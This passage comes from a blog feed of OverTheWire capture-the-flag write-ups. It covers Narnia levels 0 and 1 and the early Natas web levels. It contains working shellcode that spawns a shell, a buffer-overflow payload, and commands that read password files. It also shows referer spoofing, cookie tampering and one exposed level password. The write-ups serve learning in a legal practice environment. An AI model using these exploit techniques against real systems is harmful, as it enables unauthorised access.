+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><summary type="html">Introduction</summary></entry><entry><title type="html">Overthewire.org - Narnia 1 -&amp;gt; 2</title><link href="http://localhost:4000/2017/02/02/overthewire.org-narnia-2/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 1 -&gt; 2" /><published>2017-02-02T01:00:00+01:00</published><updated>2017-02-02T01:00:00+01:00</updated><id>http://localhost:4000/2017/02/02/overthewire.org-narnia-2</id><content type="html" xml:base="http://localhost:4000/2017/02/02/overthewire.org-narnia-2/">&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;Another month, another challenge, next part of OverTheWire's Narnia wargames. Unfortunately lack of time, made it impossible for me to publish anything sooner. Sorry for that!&lt;/p&gt;
+
+&lt;h1&gt;Challenge&lt;/h1&gt;
+
+&lt;p&gt;Firstly let's take a look at the code of the program. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)();&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EGG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;    
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Give me something to execute at the env-variable EGG&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Trying to execute EGG!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EGG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The first thing that I see is that this program will check, whether or not the value of EGG variable is empty, if yes, it will print the message. But if not, it will try to execute it. &lt;/p&gt;
+
+&lt;p&gt;But what is enviromental variable? &lt;/p&gt;
+
+&lt;p&gt;Every time shell session is started, process is gathering information that should be available to the shell process and all child processes, putting them in special area called &lt;b&gt;enviroment&lt;/b&gt;. &lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;Enviromental variables&lt;/b&gt; provide a way to influence the behaviour of software on the system. For example, the &quot;LANG&quot; environment variable determines the language in which software programs communicate with the user. They are represented as an key-value pairs. &lt;/p&gt;
+
+&lt;pre&gt;
+KEY=VALUE
+KEY=VALUE1:VALUE2
+KEY=&quot;VALUE WITH SPACES&quot;
+&lt;/pre&gt;
+
+&lt;p&gt;Now when we understand the topic, let's try to set EGG variable as some random text possibly causing the program to crash. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;narnia1@melinda:/narnia$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;EGG&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;completelyrandomtext&quot;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;narnia1@melinda:/narnia$ &lt;/span&gt;./narnia1
+Trying to execute EGG!
+Segmentation fault&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Yes! Now let's try and find some x86 shellcode that will be executed by the program. What I found working, was this &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-811.php&quot;&gt;shellcode&lt;/a&gt;, which was actually second one I've tried - the first one didn't want to cooperate ;)&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;narnia1@melinda:/narnia$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;EGG&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;50&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;68&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;73&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;68&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;68&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;69&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6e&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;89&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;e3&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;89&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c1&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;89&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;b0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;80&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;40&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;80&lt;span class=&quot;s1&quot;&gt;'
+narnia1@melinda:/narnia$ ./narnia1
+Trying to execute EGG!
+$ whoami
+narnia2
+$ cat /etc/narnia_pass/narnia2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We have the password to the next level! &lt;/p&gt;
+
+&lt;h1&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;It was another great challenge from &lt;a href=&quot;www.overthewire.org&quot;&gt;OverTheWire&lt;/a&gt;. I'm looking forward to the next one, maybe something a little bit harder? We'll see!&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;UPDATE&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;To gain better insight into who visits my website, I decided to add Piwik Analytics as a way to both give me essential information, and to repsect your privacy. You can read more at the &lt;a href=&quot;/privacy/&quot;&gt;Privacy Policy&lt;/a&gt;, but if you still have any questions, contact me and I'll try my best to answer. &lt;/p&gt;
+
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><summary type="html">Introduction
+Another month, another challenge, next part of OverTheWire's Narnia wargames. Unfortunately lack of time, made it impossible for me to publish anything sooner. Sorry for that!</summary></entry><entry><title type="html">Overthewire.org - Narnia 0 -&amp;gt; 1</title><link href="http://localhost:4000/2017/01/01/overthewire.org-narnia-1/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 0 -&gt; 1" /><published>2017-01-01T01:00:00+01:00</published><updated>2017-01-01T01:00:00+01:00</updated><id>http://localhost:4000/2017/01/01/overthewire.org-narnia-1</id><content type="html" xml:base="http://localhost:4000/2017/01/01/overthewire.org-narnia-1/">&lt;h1&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;As a part of my New Year's resolutions I decided to improve my knowledge of binary exploitation, learn more by completing challenges from &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;, especially Narnia, as they are aimed to people wanting to learn about basics. &lt;/p&gt;
+
+&lt;h1&gt;Challenge&lt;/h1&gt;
+
+&lt;p&gt;Firstly, let's take a look at the code of this program. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Here is your chance: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%24s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;buf: %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;val: 0x%08x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;WAY OFF!!!!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Okay, now we know that the binary accepts one string input from the user and puts the string into a buffer of 20 bytes, then if the value of variable &lt;b&gt;val&lt;/b&gt; is equal to &lt;b&gt;0xdeadbeef&lt;/b&gt;, we will get a shell. Let's try to send to 20 &quot;A&quot; characters, with 4 letters &quot;B&quot;, in order to overflow the buffer, and overwrite the value of &lt;b&gt;0x41414141&lt;/b&gt; with our &quot;B&quot; letters. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia0@melinda:/narnia$ python -c print'(&quot;A&quot; * 20) + &quot;BBBB&quot;' | ./narnia0
+Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
+val: 0x42424242
+WAY OFF!!!!
+narnia0@melinda:/narnia$&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, now we know that it works and we're one step closer to the solution. Now let's think how we can change value to &lt;b&gt;0xdeadbeef&lt;/b&gt;. First thing to remember - the values need to be in hex format, not characters as I thought at first. In addition, I recalled that the bytes will be in reversed order, so we have to write them from the last to the first one. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia0@melinda:/narnia$ python -c print'(&quot;A&quot; * 20) + &quot;\xef\xbe\xad\xde&quot;' | ./narnia0
+Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
+val: 0xdeadbeef&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We got the shell but it closed immediately! Let's find a way to keep it running, in order to view the password to the next level. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia0@melinda:/narnia$ (python -c print'(&quot;A&quot; * 20) + &quot;\xef\xbe\xad\xde&quot;'; cat /etc/narnia_pass/narnia1) | ./narnia0
+Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
+val: 0xdeadbeef
+cat: /etc/narnia_pass/narnia1: Permission denied&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Unfortunately, it closed too quickly and the command was executed after the shell had closed. I tried many other commands, and noticed something strange - &lt;b&gt;cat&lt;/b&gt; seemed to do exactly what we want! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia0@melinda:/narnia$ (python -c print'(&quot;A&quot; * 20) + &quot;\xef\xbe\xad\xde&quot;'; cat) | ./narnia0
+Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
+val: 0xdeadbeef
+whoami
+narnia1
+cat /etc/narnia_pass/narnia1
+********&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;But why is it working? From man page: &lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;With no FILE, or when FILE is -, read standard input.&lt;/b&gt;&lt;/p&gt;
+
+&lt;h1&gt;Last words&lt;/h1&gt;
+
+&lt;p&gt;As I never tought before, this was a great challenge, and I think I got more interested in binary exploitation and reverse engineering. Can't wait to try out some other challenges, and I'll see you in the next one!&lt;/p&gt;
+
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><summary type="html">Introduction</summary></entry><entry><title type="html">Overthewire.org - Natas</title><link href="http://localhost:4000/2016/12/25/overthewire.org-natas/" rel="alternate" type="text/html" title="Overthewire.org - Natas" /><published>2016-12-25T01:00:00+01:00</published><updated>2016-12-25T01:00:00+01:00</updated><id>http://localhost:4000/2016/12/25/overthewire.org-natas</id><content type="html" xml:base="http://localhost:4000/2016/12/25/overthewire.org-natas/">&lt;h1&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Welcome back to another OverTheWire wargame called &quot;Leviathan&quot; - which is made only of tasks connected to web security. As the number of exercises is very big (33 at the time of publishing this post), I will break it down in a few smaller parts. Without wasting your time, let's get started! &lt;/p&gt;
+
+&lt;h1&gt;0&lt;/h1&gt;
+
+&lt;p&gt;Firstly, we are greeted with this message: &lt;/p&gt;
+&lt;pre&gt;You can find the password for the next level on this page.&lt;/pre&gt;
+&lt;p&gt;As you may suspect, password is hidden somewhere in the source code of the website. Let's take a look: &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+You can find the password for the next level on this page.
+
+&lt;span class=&quot;c&quot;&gt;&amp;lt;!--The password for natas1 is *********************** --&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;There it is, commented out. Now let's jump into the next level.&lt;/p&gt;
+
+&lt;h1&gt;1&lt;/h1&gt;
+
+&lt;p&gt;This time we have more 'serious' protection going on.&lt;/p&gt;
+&lt;pre&gt;You can find the password for the next level on this page, but rightclicking has been blocked!&lt;/pre&gt;
+&lt;p&gt;One of the ways to bypass this protection, is to enter &lt;b&gt;view-source:&lt;/b&gt; before the URL of the website. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+You can find the password for the
+next level on this page, but rightclicking has been blocked!
+
+&lt;span class=&quot;c&quot;&gt;&amp;lt;!--The password for natas2 is *********************** --&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1&gt;2&lt;/h1&gt;
+
+&lt;p&gt;This time, we have to look somewhere outside of the source code. &lt;/p&gt;
+&lt;pre&gt;There is nothing on this page&lt;/pre&gt;
+
+&lt;p&gt;The first thing that comes to my mind is &lt;b&gt;robots.txt&lt;/b&gt; - they sometimes contain very useful information. Unfortunately, it did not work out this time. But there was something that concerned me. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+There is nothing on this page
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;files/pixel.png&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;What is this &lt;b&gt;pixel.png&lt;/b&gt;? It's in the directory called files, maybe we'll find something more useful there.&lt;/p&gt;
+
+&lt;p&gt;Great, apart from pixel.png we have &lt;b&gt;users.txt&lt;/b&gt; containing pass for the next one!&lt;/p&gt;
+
+&lt;pre&gt;
+# username:password
+alice:BYNdCesZqW
+bob:jw2ueICLvT
+charlie:G5vCxkVV3m
+natas3:***********************
+eve:zo4mJWyNj2
+mallory:9urtcpzBmH
+&lt;/pre&gt;
+
+&lt;h1&gt;3&lt;/h1&gt;
+
+&lt;p&gt;Once again: &lt;/p&gt;
+&lt;pre&gt;There is nothing on this page&lt;/pre&gt;
+
+&lt;p&gt;But!&lt;/p&gt;
+&lt;p&gt;This time we have a clue in &lt;b&gt;robots.txt&lt;/b&gt;. I knew it will help at some point!&lt;/p&gt;
+&lt;pre&gt;
+User-agent: *
+Disallow: /s3cr3t/
+&lt;/pre&gt;
+
+&lt;p&gt;Going under this directory lets us view another users.txt with password to the next one. &lt;/p&gt;
+&lt;pre&gt;
+natas4:***********************
+&lt;/pre&gt;
+
+&lt;h1&gt;4&lt;/h1&gt;
+
+&lt;p&gt;Oh, something new!&lt;/p&gt;
+&lt;pre&gt;Access disallowed. You are visiting from &quot;&quot; while authorized users should come only from &quot;http://natas5.natas.labs.overthewire.org/&quot;&lt;/pre&gt;
+
+&lt;p&gt;It must be something with HTTP referer, changing it's property (spoofing) may allow me to enter. &lt;/p&gt;
+
+&lt;p&gt;After quick googling, I came up with this plugin for Chrome - &lt;a href=&quot;https://chrome.google.com/webstore/detail/referer-control/acehenlbileblompmkkoimgobmcdkgeb&quot;&gt;Referer Control&lt;/a&gt;. After changing the referer to this, provided in instructions, and refreshing the page I got the pass to the next one. &lt;/p&gt;
+
+&lt;pre&gt;
+Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+&lt;/pre&gt;
+
+&lt;h1&gt;5&lt;/h1&gt;
+
+&lt;p&gt;But, how can I log in? :D&lt;/p&gt;
+
+&lt;pre&gt;Access disallowed. You are not logged in&lt;/pre&gt;
+
+&lt;p&gt;Actually, this level was very easy - using &lt;a href=&quot;http://www.editthiscookie.com/&quot;&gt;EditThisCookie&lt;/a&gt; I was able to change the value of loggedin cookie from 0 to 1, resulting in ability to view the password. &lt;/p&gt;
+
+&lt;pre&gt;
+Access granted. The password for natas6 is ***********************
+&lt;/pre&gt;
+
+&lt;h1&gt;6&lt;/h1&gt;
+
+&lt;p&gt;This time we've got simple form, with ability to view it's source code. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;includes/secret.inc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;array_key_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'secret'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Access granted. The password for natas7 is &amp;lt;censored&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Wrong secret&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Actually, we don't have to analyze whole code, what's essential is the &lt;b&gt;include&lt;/b&gt; part and since &lt;b&gt;$secret&lt;/b&gt; is assigned nowhere in this code I can assume, that it's in the secret.inc file. Let's check it!&lt;/p&gt;
+
